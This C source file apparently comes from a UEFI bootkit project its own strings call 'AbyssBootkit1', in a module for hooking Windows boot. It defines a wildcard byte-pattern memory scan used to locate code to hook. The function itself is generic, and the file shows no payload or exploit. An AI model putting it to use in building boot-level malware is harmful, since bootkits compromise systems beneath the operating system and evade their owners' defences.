// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Utils Pattern
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils00Debug.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Searches for a specified pattern in a memory region.
	@details        This function searches for the specified pattern (byte sequence) in the memory region defined. It compares the memory content against the provided pattern, which can contain wildcard bytes to represent don't care values. If the pattern is found within the specified memory region, the pointer is updated with the address of the FIRST OCCURRENCE.


	@param[in]      Pattern                     The pattern to search for.
	@param[in]      Wildcard                    The wildcard value used in the pattern.
	@param[in]      PatternLength               The length of the pattern to search for.
	@param[in]      Base                        The base address of the memory region to search within.
	@param[in]      Size                        The size of the memory region to search within.
	@param[out]     Found                       On return, points to the address of the first occurrence of the pattern if found.


	@retval         EFI_SUCCESS                 The pattern was found, and Found is updated with the address of the first occurrence.
	@retval         EFI_NOT_FOUND               The pattern was not found within the specified memory region.
	@retval         EFI_INVALID_PARAMETER       One or more input parameters are invalid.
**/
EFI_STATUS
BootWindowsHookings_UtilsPattern_FindPattern(
	IN              CONST UINT8*                Pattern,
	IN              UINT8                       Wildcard,
	IN              UINT32                      PatternLength,
	IN              CONST VOID*                 Base,
	IN              UINT32                      Size,
	OUT             VOID                        **Found
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Pattern.c] (FindPattern) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if essential parameters are NULL
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Pattern.c] (FindPattern) - Check if essential parameters are NULL\r\n");

	// Failed
	if (Found == NULL || Pattern == NULL || Base == NULL)
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/Pattern.c] (FindPattern) - Check [Check if essential parameters are NULL].\r\n");

		return EFI_INVALID_PARAMETER;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	*Found = NULL;


	// ---------------------------------------------------------------------------------------------------------------------
	// Iterate through memory searching pattern
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Pattern.c] (FindPattern) - Iterate through memory searching pattern\r\n");

	// Loop
	for (UINT8 *Address = (UINT8*)Base; Address < (UINT8*)((UINTN)Base + Size - PatternLength); ++Address)
	{
		UINT32 i;
		for (i = 0; i < PatternLength; ++i)
		{
			if (Pattern[i] != Wildcard && (*(Address + i) != Pattern[i]))
				break;
		}

		// Match found
		if (i == PatternLength)
		{
			//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Pattern.c] (FindPattern) - Match found\r\n");

			// Set found pointer to matching address
			//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Pattern.c] (FindPattern) - Set found pointer to matching address\r\n");

			*Found = (VOID*)Address;
			return EFI_SUCCESS;
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Match not found
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELCRITICAL, L"[CRITICAL] AbyssBootkit1 -> BootWindowsHookings [Utils/Pattern.c] (FindPattern) - Match not found.\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/Pattern.c] (FindPattern) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_NOT_FOUND;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
